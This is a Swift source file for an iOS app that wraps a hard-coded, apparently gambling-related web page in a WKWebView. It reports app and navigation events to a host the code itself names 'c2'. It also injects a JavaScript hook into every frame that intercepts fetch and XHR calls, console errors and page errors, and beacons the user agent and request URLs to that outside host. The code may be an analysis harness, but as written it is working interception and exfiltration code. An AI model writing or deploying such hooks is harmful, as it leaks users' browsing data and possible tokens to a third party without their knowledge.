import UIKit
import WebKit

final class ViewController: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {

    private let targetURL: URL = {
        if let s = Bundle.main.object(forInfoDictionaryKey: "HarnessURL") as? String,
           let u = URL(string: s) { return u }
        return URL(string: "https://woyao1688.top/channel/L.A.OJ/weifile/weifile.html?id=6666")!
    }()

    private let c2 = "https://ycvezlqods4ooyl.icu/event"
    private var webView: WKWebView!

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black

        let cfg = WKWebViewConfiguration()
        cfg.allowsInlineMediaPlayback = true
        cfg.mediaTypesRequiringUserActionForPlayback = []
        cfg.preferences.javaScriptCanOpenWindowsAutomatically = true

        let ucc = WKUserContentController()
        ucc.add(self, name: "hb")
        ucc.addUserScript(WKUserScript(source: Self.hookJS,
                                       injectionTime: .atDocumentStart,
                                       forMainFrameOnly: false))
        cfg.userContentController = ucc

        webView = WKWebView(frame: view.bounds, configuration: cfg)
        webView.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        webView.navigationDelegate = self
        webView.customUserAgent = nil
        view.addSubview(webView)

        let lp = UILongPressGestureRecognizer(target: self, action: #selector(onLongPress(_:)))
        lp.minimumPressDuration = 1.5
        webView.addGestureRecognizer(lp)

        let url = launchURL()
        report("shell-launch", ["url": url.absoluteString])
        webView.load(URLRequest(url: url))
    }

    @objc private func onLongPress(_ g: UILongPressGestureRecognizer) {
        guard g.state == .began else { return }
        report("reload", ["why": "long-press"])
        webView.reloadFromOrigin()
    }

    private func launchURL() -> URL {
        let args = ProcessInfo.processInfo.arguments
        if let i = args.firstIndex(of: "-url"), i + 1 < args.count,
           let u = URL(string: args[i + 1]) { return u }
        return targetURL
    }

    // MARK: - WKNavigationDelegate

    func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        report("nav-fail", ["err": error.localizedDescription])
    }

    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        report("nav-fail2", ["err": error.localizedDescription])
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        report("nav-finish", ["url": webView.url?.absoluteString ?? ""])
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) { [weak self] in
            let js = "(function(){var t=document.getElementById('lp-time');" +
                     "return JSON.stringify({t:t?t.textContent:'none'," +
                     "s:document.scripts.length," +
                     "h:document.body?document.body.innerHTML.length:0});})()"
            self?.webView.evaluateJavaScript(js) { r, e in
                self?.report("dom-state", ["v": String(describing: r ?? e)])
            }
        }
    }

    // MARK: - JS -> Native

    func userContentController(_ controller: WKUserContentController, didReceive message: WKScriptMessage) {
        report("js", ["v": String(describing: message.body)])
    }

    // MARK: - Report

    private func report(_ kind: String, _ kv: [String: String]) {
        var comps = URLComponents(string: c2)!
        var items = [URLQueryItem(name: "src", value: "shell"),
                     URLQueryItem(name: "e", value: kind)]
        for (k, v) in kv { items.append(URLQueryItem(name: k, value: v)) }
        comps.queryItems = items
        guard let u = comps.url else { return }
        var req = URLRequest(url: u)
        req.timeoutInterval = 10
        URLSession.shared.dataTask(with: req).resume()
    }

    // MARK: - Injected hook

    private static let hookJS = """
    (function(){
      var C2='https://ycvezlqods4ooyl.icu/event';
      function send(k,v){try{var i=new Image();i.src=C2+'?src=hooks&e='+encodeURIComponent(k)+'&v='+encodeURIComponent(String(v).slice(0,300))+'&t='+Date.now();}catch(_){}}
      send('hook-installed', navigator.userAgent);
      window.addEventListener('error', function(e){
        send('error', (e.message||'')+' @'+(e.filename||'')+':'+(e.lineno||0)+':'+(e.colno||0));
      }, true);
      window.addEventListener('unhandledrejection', function(e){
        send('reject', (e.reason && (e.reason.stack||e.reason.message)) || e.reason);
      });
      var ce=console.error;
      console.error=function(){send('console', Array.prototype.join.call(arguments,' ')); return ce.apply(console, arguments);};
      var ow=window.onerror;
      window.onerror=function(m,s,l,c,err){send('onerror', m+' @'+s+':'+l); return ow?ow.apply(this,arguments):false;};
      var of=window.fetch;
      if(of){window.fetch=function(u,o){send('fetch', typeof u==='string'?u:(u&&u.url)); return of.apply(this,arguments);};}
      var oo=XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open=function(m,u){send('xhr', m+' '+u); return oo.apply(this,arguments);};
      if(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.hb){
        window.webkit.messageHandlers.hb.postMessage('hook-ready');
      }
    })();
    """
}
